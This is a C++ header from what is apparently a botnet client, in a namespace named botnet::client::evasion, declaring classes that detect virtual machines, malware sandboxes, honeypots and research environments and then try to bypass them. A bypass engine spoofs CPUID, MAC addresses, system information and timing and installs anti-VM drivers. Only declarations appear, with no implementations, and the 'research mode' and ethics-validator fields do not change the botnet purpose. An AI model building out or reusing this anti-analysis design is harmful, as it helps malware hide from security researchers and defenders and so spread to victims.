#pragma once

#include <memory>
#include <string>
#include <vector>
#include <map>
#include <atomic>
#include <mutex>
#include <chrono>
#include <functional>
#include <nlohmann/json.hpp>
#include "../../../common/utils/platform_utils.h"

namespace botnet {
namespace client {
namespace evasion {

/**
 * @brief Advanced VM and sandbox detection/bypass system - single codebase
 * 
 * Implements sophisticated techniques to detect and evade virtual machines,
 * sandboxes, and analysis environments. Works across all platforms.
 */
class VMDetection {
public:
    enum class EnvironmentType {
        PHYSICAL_MACHINE,
        VMWARE_WORKSTATION,
        VMWARE_PLAYER,
        VMWARE_ESXI,
        VIRTUALBOX,
        HYPER_V,
        QEMU_KVM,
        XEN,
        PARALLELS,
        DOCKER_CONTAINER,
        LXC_CONTAINER,
        CHROOT_JAIL,
        WINE_EMULATION,
        CUCKOO_SANDBOX,
        ANUBIS_SANDBOX,
        JOEBOX_SANDBOX,
        THREATANALYZER_SANDBOX,
        HYBRID_ANALYSIS,
        ANY_RUN_SANDBOX,
        ANALYSIS_ENVIRONMENT,
        HONEYPOT,
        UNKNOWN_VIRTUAL,
        RESEARCH_ENVIRONMENT
    };

    enum class DetectionMethod {
        HARDWARE_INSPECTION,
        REGISTRY_ANALYSIS,
        FILE_SYSTEM_ANALYSIS,
        PROCESS_ANALYSIS,
        NETWORK_ANALYSIS,
        TIMING_ANALYSIS,
        INSTRUCTION_TESTING,
        MEMORY_ANALYSIS,
        DRIVER_ANALYSIS,
        SERVICE_ANALYSIS,
        BEHAVIORAL_ANALYSIS,
        ARTIFACT_DETECTION,
        USER_INTERACTION_ANALYSIS,
        ENVIRONMENT_VARIABLE_ANALYSIS
    };

    struct DetectionConfig {
        std::vector<DetectionMethod> methods;
        bool aggressive_detection;
        bool stealth_detection;
        std::chrono::seconds detection_timeout;
        bool enable_bypass_attempts;
        bool research_mode;
        std::string research_session_id;
        bool comprehensive_logging;
    };

    struct DetectionResult {
        EnvironmentType detected_environment;
        std::vector<DetectionMethod> successful_methods;
        std::map<std::string, std::string> evidence;
        float confidence_score;
        bool bypass_successful;
        std::vector<std::string> bypass_techniques_used;
        nlohmann::json technical_details;
        bool research_environment_detected;
    };

public:
    VMDetection();
    ~VMDetection();

    // Core detection operations
    bool Initialize(const DetectionConfig& config);
    DetectionResult PerformDetection();
    bool AttemptBypass(EnvironmentType environment);
    bool IsRunningInVirtualEnvironment() const;
    
    // Specific environment detection
    bool DetectVMware();
    bool DetectVirtualBox();
    bool DetectHyperV();
    bool DetectQEMU();
    bool DetectXen();
    bool DetectDocker();
    bool DetectSandbox();
    bool DetectAnalysisEnvironment();
    
    // Detection method implementations
    DetectionResult HardwareInspection();
    DetectionResult RegistryAnalysis();
    DetectionResult FileSystemAnalysis();
    DetectionResult ProcessAnalysis();
    DetectionResult NetworkAnalysis();
    DetectionResult TimingAnalysis();
    DetectionResult InstructionTesting();
    DetectionResult MemoryAnalysis();
    
    // Bypass techniques
    bool BypassVMwareDetection();
    bool BypassVirtualBoxDetection();
    bool BypassSandboxDetection();
    bool BypassAnalysisEnvironment();
    
    // Research mode
    void EnableResearchMode(const std::string& session_id);
    DetectionResult PerformResearchDetection();
    nlohmann::json GenerateEnvironmentReport() const;
    std::vector<std::string> GetDetectionLogs() const;

private:
    // Forward declarations for detection modules
    class HardwareDetector;
    class RegistryDetector;
    class FileSystemDetector;
    class ProcessDetector;
    class NetworkDetector;
    class TimingDetector;
    class InstructionDetector;
    class MemoryDetector;
    class BehavioralDetector;
    class BypassEngine;

    DetectionConfig config_;
    
    // Detection modules
    std::unique_ptr<HardwareDetector> hardware_detector_;
    std::unique_ptr<RegistryDetector> registry_detector_;
    std::unique_ptr<FileSystemDetector> filesystem_detector_;
    std::unique_ptr<ProcessDetector> process_detector_;
    std::unique_ptr<NetworkDetector> network_detector_;
    std::unique_ptr<TimingDetector> timing_detector_;
    std::unique_ptr<InstructionDetector> instruction_detector_;
    std::unique_ptr<MemoryDetector> memory_detector_;
    std::unique_ptr<BehavioralDetector> behavioral_detector_;
    std::unique_ptr<BypassEngine> bypass_engine_;
    
    // Detection state
    DetectionResult last_detection_result_;
    mutable std::mutex detection_mutex_;
    
    // Research mode
    bool research_mode_;
    std::string research_session_id_;
    mutable std::vector<std::string> detection_logs_;
    mutable std::mutex logs_mutex_;
    
    // Internal methods
    bool InitializeDetectors();
    EnvironmentType AnalyzeDetectionResults(const std::vector<DetectionResult>& results);
    float CalculateConfidenceScore(const DetectionResult& result);
    void LogDetectionAttempt(DetectionMethod method, bool success, const std::string& details);
};

/**
 * @brief Hardware-based VM detection
 */
class VMDetection::HardwareDetector {
public:
    HardwareDetector();
    ~HardwareDetector();

    bool Initialize();
    DetectionResult PerformDetection();
    
    // CPU-based detection
    bool DetectVMwareCPUID();
    bool DetectVirtualBoxCPUID();
    bool DetectHyperVCPUID();
    bool DetectQEMUCPUID();
    bool CheckCPUVendorStrings();
    bool CheckCPUFeatures();
    
    // Hardware enumeration
    bool DetectVirtualHardware();
    bool CheckSystemManufacturer();
    bool CheckSystemModel();
    bool CheckBIOSVersion();
    bool CheckMotherboard();
    
    // Advanced CPU detection
    bool CheckCPUTimestamp();
    bool CheckCPUTemperature();
    bool CheckCPUCacheSize();
    bool DetectVirtualizationExtensions();
    
    // Research mode detection
    DetectionResult PerformResearchHardwareDetection();

private:
    // CPUID utilities
    struct CPUIDResult {
        uint32_t eax, ebx, ecx, edx;
    };
    
    CPUIDResult ExecuteCPUID(uint32_t function, uint32_t subfunction = 0);
    bool CheckCPUIDHypervisorBit();
    std::string ExtractHypervisorVendor();
    
    // Hardware inspection
    std::string GetSystemManufacturer();
    std::string GetSystemModel();
    std::string GetBIOSVendor();
    std::string GetBIOSVersion();
    std::vector<std::string> EnumerateHardwareDevices();
    
    // Timing-based detection
    uint64_t MeasureRDTSCTiming();
    bool DetectVMTimingAnomalies();
    uint64_t GetCPUTimestamp();
    
    // Research logging
    void LogHardwareDetection(const std::string& component, const std::string& value, bool suspicious);
};

/**
 * @brief Registry-based VM detection (Windows)
 */
class VMDetection::RegistryDetector {
public:
    RegistryDetector();
    ~RegistryDetector();

    bool Initialize();
    DetectionResult PerformDetection();
    
    // VM-specific registry checks
    bool CheckVMwareRegistryKeys();
    bool CheckVirtualBoxRegistryKeys();
    bool CheckHyperVRegistryKeys();
    bool CheckQEMURegistryKeys();
    
    // System registry analysis
    bool CheckSystemRegistryEntries();
    bool CheckInstalledSoftwareRegistry();
    bool CheckHardwareRegistryEntries();
    bool CheckServiceRegistryEntries();
    
    // Advanced registry techniques
    bool CheckRegistryTimestamps();
    bool CheckRegistryPermissions();
    bool CheckHiddenRegistryKeys();
    
    // Research mode detection
    DetectionResult PerformResearchRegistryDetection();

private:
    std::vector<std::string> vmware_registry_keys_;
    std::vector<std::string> virtualbox_registry_keys_;
    std::vector<std::string> hyperv_registry_keys_;
    
    // Registry utilities
    bool RegistryKeyExists(const std::string& key_path);
    std::string GetRegistryValue(const std::string& key_path, const std::string& value_name);
    std::vector<std::string> EnumerateRegistrySubkeys(const std::string& key_path);
    std::vector<std::string> EnumerateRegistryValues(const std::string& key_path);
    
    // VM signature detection
    bool ContainsVMSignature(const std::string& value, const std::vector<std::string>& signatures);
    std::vector<std::string> GetVMwareSignatures();
    std::vector<std::string> GetVirtualBoxSignatures();
    std::vector<std::string> GetHyperVSignatures();
    
    // Research logging
    void LogRegistryDetection(const std::string& key_path, const std::string& value, bool suspicious);
};

/**
 * @brief File system-based VM detection
 */
class VMDetection::FileSystemDetector {
public:
    FileSystemDetector();
    ~FileSystemDetector();

    bool Initialize();
    DetectionResult PerformDetection();
    
    // VM-specific file detection
    bool CheckVMwareFiles();
    bool CheckVirtualBoxFiles();
    bool CheckHyperVFiles();
    bool CheckQEMUFiles();
    bool CheckDockerFiles();
    
    // Driver and service file detection
    bool CheckVMDrivers();
    bool CheckVMServices();
    bool CheckVMToolsInstallation();
    
    // Sandbox-specific file detection
    bool CheckSandboxFiles();
    bool CheckAnalysisToolFiles();
    bool CheckDebuggingToolFiles();
    
    // File system characteristics
    bool CheckFileSystemType();
    bool CheckDiskSerialNumbers();
    bool CheckVolumeLabels();
    bool CheckFileSystemTimestamps();
    
    // Research mode detection
    DetectionResult PerformResearchFileSystemDetection();

private:
    std::vector<std::string> vmware_files_;
    std::vector<std::string> virtualbox_files_;
    std::vector<std::string> hyperv_files_;
    std::vector<std::string> sandbox_files_;
    
    // File utilities
    bool FileExists(const std::string& file_path);
    bool DirectoryExists(const std::string& directory_path);
    std::vector<std::string> FindFilesWithPattern(const std::string& directory, const std::string& pattern);
    std::string GetFileVersion(const std::string& file_path);
    
    // Drive and volume analysis
    std::vector<std::string> GetLogicalDrives();
    std::string GetVolumeLabel(const std::string& drive);
    std::string GetDiskSerialNumber(const std::string& drive);
    std::string GetFileSystemType(const std::string& drive);
    
    // Cross-platform file detection
    bool CheckLinuxVMFiles();
    bool CheckMacOSVMFiles();
    bool CheckUnixVMCharacteristics();
    
    // Research logging
    void LogFileSystemDetection(const std::string& path, bool found, const std::string& type);
};

/**
 * @brief Process and service-based VM detection
 */
class VMDetection::ProcessDetector {
public:
    ProcessDetector();
    ~ProcessDetector();

    bool Initialize();
    DetectionResult PerformDetection();
    
    // VM process detection
    bool CheckVMwareProcesses();
    bool CheckVirtualBoxProcesses();
    bool CheckHyperVProcesses();
    bool CheckQEMUProcesses();
    
    // VM service detection
    bool CheckVMwareServices();
    bool CheckVirtualBoxServices();
    bool CheckHyperVServices();
    
    // Sandbox process detection
    bool CheckSandboxProcesses();
    bool CheckAnalysisToolProcesses();
    bool CheckDebuggingProcesses();
    bool CheckMonitoringProcesses();
    
    // Process behavior analysis
    bool AnalyzeProcessBehavior();
    bool CheckProcessEnvironment();
    bool CheckProcessCommandLines();
    bool CheckProcessParents();
    
    // Research mode detection
    DetectionResult PerformResearchProcessDetection();

private:
    std::vector<std::string> vmware_processes_;
    std::vector<std::string> virtualbox_processes_;
    std::vector<std::string> hyperv_processes_;
    std::vector<std::string> sandbox_processes_;
    
    // Process utilities
    std::vector<uint32_t> GetRunningProcesses();
    std::string GetProcessName(uint32_t process_id);
    std::string GetProcessPath(uint32_t process_id);
    std::string GetProcessCommandLine(uint32_t process_id);
    uint32_t GetParentProcessId(uint32_t process_id);
    
    // Service utilities
    std::vector<std::string> GetRunningServices();
    bool IsServiceRunning(const std::string& service_name);
    std::string GetServiceDisplayName(const std::string& service_name);
    std::string GetServiceExecutablePath(const std::string& service_name);
    
    // Cross-platform process detection
    bool CheckLinuxVMProcesses();
    bool CheckMacOSVMProcesses();
    std::vector<std::string> GetUnixProcessList();
    
    // Research logging
    void LogProcessDetection(const std::string& process_name, bool suspicious, const std::string& reason);
};

/**
 * @brief Network-based VM detection
 */
class VMDetection::NetworkDetector {
public:
    NetworkDetector();
    ~NetworkDetector();

    bool Initialize();
    DetectionResult PerformDetection();
    
    // Network adapter detection
    bool CheckVMNetworkAdapters();
    bool CheckMACAddresses();
    bool CheckNetworkAdapterNames();
    bool CheckNetworkDrivers();
    
    // Network configuration analysis
    bool CheckIPConfiguration();
    bool CheckDNSConfiguration();
    bool CheckGatewayConfiguration();
    bool CheckNetworkTopology();
    
    // VM-specific network signatures
    bool CheckVMwareNetworkSignatures();
    bool CheckVirtualBoxNetworkSignatures();
    bool CheckHyperVNetworkSignatures();
    
    // Research mode detection
    DetectionResult PerformResearchNetworkDetection();

private:
    std::vector<std::string> vmware_mac_prefixes_;
    std::vector<std::string> virtualbox_mac_prefixes_;
    std::vector<std::string> hyperv_mac_prefixes_;
    
    // Network utilities
    std::vector<std::string> GetNetworkAdapters();
    std::string GetMACAddress(const std::string& adapter_name);
    std::string GetIPAddress(const std::string& adapter_name);
    std::string GetAdapterDescription(const std::string& adapter_name);
    
    // MAC address analysis
    std::string ExtractMACPrefix(const std::string& mac_address);
    bool IsVMMACPrefix(const std::string& mac_prefix);
    std::string GetMACVendor(const std::string& mac_prefix);
    
    // Network configuration
    std::string GetDefaultGateway();
    std::vector<std::string> GetDNSServers();
    std::string GetDHCPServer();
    
    // Research logging
    void LogNetworkDetection(const std::string& adapter, const std::string& detail, bool suspicious);
};

/**
 * @brief Timing-based VM detection
 */
class VMDetection::TimingDetector {
public:
    TimingDetector();
    ~TimingDetector();

    bool Initialize();
    DetectionResult PerformDetection();
    
    // CPU timing tests
    bool PerformRDTSCTest();
    bool PerformCPUBenchmark();
    bool CheckTimingConsistency();
    bool DetectTimingAnomalies();
    
    // Instruction timing
    bool MeasureInstructionTiming();
    bool TestPrivilegedInstructions();
    bool TestCPUIDTiming();
    
    // Sleep and delay timing
    bool TestSleepAccuracy();
    bool TestTimerResolution();
    bool CheckSystemClock();
    
    // Research mode detection
    DetectionResult PerformResearchTimingDetection();

private:
    // Timing measurement utilities
    std::chrono::high_resolution_clock::time_point GetHighResolutionTime();
    uint64_t GetCPUTimestamp();
    double MeasureInstructionLatency(std::function<void()> instruction);
    
    // Timing tests
    bool PerformCPUIntensiveTask();
    double MeasureMemoryAccessTiming();
    double MeasureDiskAccessTiming();
    
    // Statistical analysis
    double CalculateTimingVariance(const std::vector<double>& timings);
    bool IsTimingAnomalous(const std::vector<double>& timings, double threshold);
    double CalculateTimingMean(const std::vector<double>& timings);
    
    // Research logging
    void LogTimingDetection(const std::string& test_name, double result, bool anomalous);
};

/**
 * @brief CPU instruction-based VM detection
 */
class VMDetection::InstructionDetector {
public:
    InstructionDetector();
    ~InstructionDetector();

    bool Initialize();
    DetectionResult PerformDetection();
    
    // Privileged instruction testing
    bool TestPrivilegedInstructions();
    bool TestVMwareInstructions();
    bool TestHyperVInstructions();
    bool TestInvalidInstructions();
    
    // Exception handling tests
    bool TestExceptionHandling();
    bool TestInvalidMemoryAccess();
    bool TestInvalidOpcodes();
    
    // Research mode detection
    DetectionResult PerformResearchInstructionDetection();

private:
    // Instruction testing utilities
    bool ExecuteWithExceptionHandling(std::function<void()> instruction);
    bool TestSpecificInstruction(const std::vector<uint8_t>& instruction_bytes);
    
    // VM-specific instruction tests
    bool TestVMwareBackdoorInstruction();
    bool TestHyperVHypercalls();
    bool TestVirtualBoxInstructions();
    
    // Research logging
    void LogInstructionDetection(const std::string& instruction_name, bool exception_caught, const std::string& result);
};

/**
 * @brief VM bypass and evasion engine
 */
class VMDetection::BypassEngine {
public:
    BypassEngine();
    ~BypassEngine();

    bool Initialize();
    bool AttemptBypass(EnvironmentType environment);
    
    // VM-specific bypass techniques
    bool BypassVMwareDetection();
    bool BypassVirtualBoxDetection();
    bool BypassHyperVDetection();
    bool BypassSandboxDetection();
    
    // General bypass techniques
    bool ModifyVMSignatures();
    bool HideVMIndicators();
    bool SpofVMDetection();
    bool CreateAntiDetectionEnvironment();
    
    // Research mode bypass
    bool PerformResearchBypass(EnvironmentType environment);

private:
    // Signature modification
    bool ModifyRegistrySignatures();
    bool ModifyFileSignatures();
    bool ModifyProcessSignatures();
    bool ModifyHardwareSignatures();
    
    // Spoofing techniques
    bool SpoofCPUID();
    bool SpoofMACAddress();
    bool SpoofSystemInformation();
    bool SpoofTimingCharacteristics();
    
    // Environment modification
    bool InstallAntiVMDrivers();
    bool ModifySystemConfiguration();
    bool CreateDecoyVMSignatures();
    
    // Research logging
    void LogBypassAttempt(const std::string& technique, EnvironmentType target, bool success);
};

/**
 * @brief VM detection validator and safety controller
 */
class VMDetectionValidator {
public:
    struct ValidationResult {
        bool allowed;
        std::string reason;
        std::vector<std::string> warnings;
        bool requires_research_approval;
        std::vector<std::string> ethical_concerns;
    };

public:
    static ValidationResult ValidateDetectionMethod(VMDetection::DetectionMethod method, bool research_mode);
    static bool IsMethodSafeForResearch(VMDetection::DetectionMethod method);
    static std::vector<VMDetection::DetectionMethod> GetResearchSafeMethods();
    static std::vector<VMDetection::DetectionMethod> GetInvasiveMethods();

private:
    static const std::vector<VMDetection::DetectionMethod> RESEARCH_SAFE_METHODS;
    static const std::vector<VMDetection::DetectionMethod> INVASIVE_METHODS;
    
    static bool IsInvasiveMethod(VMDetection::DetectionMethod method);
    static bool RequiresSystemModification(VMDetection::DetectionMethod method);
    static std::string GetMethodRiskLevel(VMDetection::DetectionMethod method);
};

} // namespace evasion
} // namespace client
} // namespace botnet
